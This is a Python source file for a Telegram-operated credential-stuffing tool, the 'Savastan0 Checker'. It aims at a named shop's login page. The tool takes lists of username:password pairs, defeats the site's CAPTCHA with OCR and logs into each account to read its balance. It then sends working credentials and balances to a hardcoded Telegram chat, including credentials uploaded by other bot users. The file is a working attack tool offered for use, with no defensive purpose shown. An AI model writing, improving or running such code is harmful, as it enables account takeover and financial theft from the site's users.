try:
    import html
    import re
    import tempfile
    import warnings
    from datetime import datetime
    from pathlib import Path
    from urllib.parse import urljoin
    import easyocr
    import requests
    from telegram import Update
    from telegram.ext import Application, ContextTypes, MessageHandler, filters
except ModuleNotFoundError:
    import os
    os.system("python3 -m pip install easyocr requests python-telegram-bot")
    import html
    import re
    import tempfile
    import warnings
    from datetime import datetime
    from pathlib import Path
    from urllib.parse import urljoin
    import easyocr
    import requests
    from telegram import Update
    from telegram.ext import Application, ContextTypes, MessageHandler, filters
LOGIN_URL = "https://savshop.mu/login"
INDEX_URL = "https://savshop.mu/index"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
TELEGRAM_BOT_TOKEN = "8994945852:AAHkR57QouDtbeP4IqWKMQSPkxikPchVD-8"
TELEGRAM_CHAT_ID = "-1004409181577"
def load_users(file_path):
    users = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            user, password = line.split(":", 1)
            users.append((user, password))
    return users
def extract_balance(page_html):
    text = re.sub(r"<[^>]+>", " ", page_html)
    text = re.sub(r"\s+", " ", text)
    match = re.search(r"Balance:\s*([0-9]+(?:\.[0-9]+)?)\s*\$", text, re.IGNORECASE)
    return match.group(1) if match else None
def get_captcha_image(session, login_url=LOGIN_URL):
    login_response = session.get(login_url, timeout=20)
    login_response.raise_for_status()
    match = re.search(
        r"""<img[^>]+src=["']([^"']*captcha[^"']*)["']""",
        login_response.text,
        flags=re.IGNORECASE,
    )
    if not match:
        raise RuntimeError("Could not find captcha image URL in login page HTML.")
    captcha_src = html.unescape(match.group(1))
    captcha_url = urljoin(login_url, captcha_src)
    image_response = session.get(captcha_url, timeout=20)
    image_response.raise_for_status()
    tmp_dir = Path(tempfile.gettempdir()) / "ctf_captcha"
    tmp_dir.mkdir(parents=True, exist_ok=True)
    output_path = tmp_dir / "captcha.png"
    output_path.write_bytes(image_response.content)
    return output_path
def follow_js_redirect(session, response, base_url):
    match = re.search(r"""location\.href\s*=\s*['"]([^'"]+)['"]""", response.text)
    if not match:
        return response
    redirect_url = urljoin(base_url, match.group(1))
    return session.get(redirect_url, timeout=20)
def login_and_get_balance(username, password):
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close",
            "Referer": LOGIN_URL,
            "Origin": "https://savshop.mu",
        }
    )
    warnings.filterwarnings(
        "ignore",
        message=r".*pin_memory.*no accelerator is found.*",
        category=UserWarning,
    )
    captcha_path = get_captcha_image(session)
    reader = easyocr.Reader(["en"], gpu=False, verbose=False)
    result = reader.readtext(str(captcha_path), detail=0)
    captcha_code = "".join(result).strip()
    data = {
        "username": username,
        "password": password,
        "CAPTCHA": captcha_code,
        "login": "Login",
    }
    response = session.post(LOGIN_URL, data=data, timeout=30, allow_redirects=True)
    if "Password or username is incorrect" in response.text:
        return False, "bad_login"
    if "Your username contains invalid characters!" in response.text:
        return False, "invalid_username"
    response = follow_js_redirect(session, response, LOGIN_URL)
    index_response = session.get(INDEX_URL, timeout=20)
    balance = extract_balance(index_response.text)
    if balance is None:
        return False, {
            "reason": "balance_not_found",
            "post_url": response.url,
            "index_url": index_response.url,
            "post_preview": response.text[:300],
            "index_preview": index_response.text[:300],
        }
    return True, balance

def send_telegram_message(bot_token, chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    data = {
        "chat_id": chat_id,
        "text": text,
    }

    if parse_mode:
        data["parse_mode"] = parse_mode

    try:
        response = requests.post(url, data=data, timeout=15)
        response.raise_for_status()
        result = response.json()

        if result.get("ok"):
            print(f"[Telegram API] ✓ Success: {result}")
            return True, result
        
        print(f"[Telegram API] ✗ API Error: {result}")
        return False, result

    except requests.RequestException as e:
        print(f"[Telegram API] ✗ Request Error: {str(e)}")
        return False, str(e)
    except Exception as e:
        print(f"[Telegram API] ✗ Unknown Error: {str(e)}")
        return False, str(e)

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle file uploads from Telegram users."""
    if not update.message or not update.message.document:
        await update.message.reply_text("Please upload a file in username:password format.")
        return
    
    try:
        # Download the file
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        file_text = file_content.decode('utf-8')
        
        # Parse credentials
        credentials = []
        for line in file_text.strip().split('\n'):
            line = line.strip()
            if not line or ":" not in line:
                continue
            user, password = line.split(":", 1)
            credentials.append((user.strip(), password.strip()))
        
        if not credentials:
            await update.message.reply_text("❌ No valid credentials found in file. Format: username:password")
            return

        if len(credentials) > 2000:
            await update.message.reply_text(
                f"❌ <b>Limit exceeded:</b> {len(credentials)} credentials found.\n"
                "Maximum allowed is <b>2000</b> per file.\n"
                "Please split the file and try again.",
                parse_mode="HTML",
            )
            return
        
        await update.message.reply_text(f"✅ Found {len(credentials)} credential(s). Processing...")
        
        # Process credentials
        hits = []
        failed = []
        
        for user, password in credentials:
            try:
                ok, result = login_and_get_balance(user, password)
                if ok:
                    hits.append((user, password, result))
                    print(f"Good account | {user}:{password} | Balance: {result}$")
                else:
                    failed.append((user, password, result))
                    print(f"Declined | {user}:{password} | {result}")
            except Exception as e:
                failed.append((user, password, str(e)))
                print(f"Error | {user}:{password} | {e}")
        
        # Send results
        if hits:
            sent_count = 0
            failed_count = 0
            for user, password, balance in hits:
                message = f"""
✅ <b>HIT FOUND!</b>

👤 <b>USERNAME:</b> {user}
🔑 <b>PASSWORD:</b> {password}
💰 <b>BALANCE:</b> {balance}$
                """
                success, result = send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message, parse_mode="HTML")
                if success:
                    sent_count += 1
                    print(f"[✓] Message sent to chat | {user}:{password}")
                else:
                    failed_count += 1
                    print(f"[✗] Failed to send message | {user}:{password} | Error: {result}")
                
                # Also send to the uploader
                await update.message.reply_text(message, parse_mode="HTML")
            
            await update.message.reply_text(f"✅ Found {len(hits)} valid account(s)! Sent {sent_count} to Telegram and to you above.")
        else:
            await update.message.reply_text(f"❌ No valid accounts found. {len(failed)} failed/declined.")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")
        print(f"File processing error: {e}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command."""
    welcome_message = """
╔══════════════════════════════════════════════════════════════╗
║          🤖 CREDENTIALS CHECKER BOT 🤖                       ║
╚══════════════════════════════════════════════════════════════╝

👋 <b>Savastan0 Checker</b>
      <b>Bot by: PORIOT</b>
📋 <b>How to use:</b>

1️⃣ Prepare a text file with credentials in this format:
   
<code>username1:password1
username2:password2
username3:password3</code>

2️⃣ Send the file to this bot

3️⃣ The bot will:
   ✅ Parse all credentials
   ✅ Check each account
   ✅ Report valid accounts with balance
   ✅ Send results back to you

📝 <b>File Format Requirements:</b>
   • Plain text file (.txt)
   • Each line: <code>username:password</code>
   • One credential per line
   • No extra spaces or special formatting
   • Empty lines will be skipped

⚡ <b>Tips:</b>
   • Larger files will take longer to process
   • Check console for detailed output
   • Invalid credentials will be marked as declined

❓ <b>Need help?</b> Use /help command

Ready to get started? Just upload a file! 📤
    """
    await update.message.reply_text(welcome_message, parse_mode="HTML")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /help command."""
    help_message = """
<b>📖 Help Guide</b>

<b>Q: What file format should I use?</b>
A: Plain .txt text file with one credential per line

<b>Q: What's the correct credential format?</b>
A: <code>username:password</code>
   Example: <code>john_doe:mypassword123</code>

<b>Q: Can passwords contain colons?</b>
A: Yes! Only the first colon is used as separator
   Example: <code>user:pass:word:123</code> → username: user, password: pass:word:123

<b>Q: What happens to my credentials?</b>
A: They are processed and checked against the target site
   Valid accounts are reported back to you

<b>Q: How long does processing take?</b>
A: Depends on file size. Average ~5-10 seconds per credential

<b>Q: What if I have errors?</b>
A: The bot will show error messages. Common errors:
   • Invalid file format
   • Incorrect username/password format
   • Network issues

<b>Q: Can I upload multiple files?</b>
A: Yes! You can upload files one at a time

For more info or issues, contact support.
    """
    await update.message.reply_text(help_message, parse_mode="HTML")

def start_telegram_bot():
    """Start the Telegram bot."""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add command handlers
    from telegram.ext import CommandHandler
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Add file upload handler
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    
    # Handler for other messages
    async def handle_other_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        await update.message.reply_text(
            "📂 Please upload a text file with credentials in <code>username:password</code> format.\n\n"
            "Use /start for detailed instructions or /help for more info.",
            parse_mode="HTML"
        )
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_other_message))
    
    # Start bot
    print("[✓] Bot started. Waiting for file uploads...")
    print("[✓] Users should use /start command to see instructions")
    application.run_polling()
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "bot":
        # Start Telegram bot
        print("[*] Starting Telegram bot...")
        start_telegram_bot()
    else:
        # Original functionality: process users.txt
        try:
            accounts = load_users("users.txt")
            for user, password in accounts:
                try:
                    ok, result = login_and_get_balance(user, password)
                    if ok:
                        print(f"Good account | {user}:{password} | Balance: {result}$")
                        message = f"""
✅ <b>ACCOUNT HIT FOUND!</b>

👤 <b>USERNAME:</b> {user}
🔑 <b>PASSWORD:</b> {password}
💰 <b>BALANCE:</b> {result}$
                        """
                        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message, parse_mode="HTML")

                    else:
                        print(f"Declined | {user}:{password} | {result}")
                except requests.RequestException as e:
                    print(f"Request failed | {user}:{password} | {e}")
        except Exception as exc:
            print(f"[-] Failed: {exc}")
